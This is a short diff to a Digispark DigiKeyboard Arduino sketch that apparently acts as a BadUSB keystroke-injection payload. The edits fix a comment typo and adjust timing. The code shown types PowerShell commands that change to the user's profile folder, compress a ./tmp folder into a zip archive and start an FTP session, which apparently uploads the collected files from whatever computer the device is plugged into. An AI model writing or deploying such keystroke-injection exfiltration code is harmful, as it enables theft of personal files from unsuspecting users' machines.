@@ -35,14 +35,13 @@ void loop() {
   DigiKeyboard.delay(1000);
 
   // Launch PowerShell
-  // .println also presses ENTER after the string
   DigiKeyboard.print(F("powershell.exe"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);
 
   // I noticed that .println results in the ENTER keystroke
   // being sent two times, this of course is a problem
-  // when data needs to be entered ad a precise time,
+  // when data needs to be entered at a precise time,
   // the workaround was using .print and manually send ENTER
   DigiKeyboard.print(F("cd $Env:userprofile"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -58,7 +57,7 @@ void loop() {
   DigiKeyboard.delay(4500);
   DigiKeyboard.print(F("Compress-Archive -Path ./tmp -DestinationPath ./tmp/tmp_archive.zip"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(6500);
   DigiKeyboard.print(F("ftp -i"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
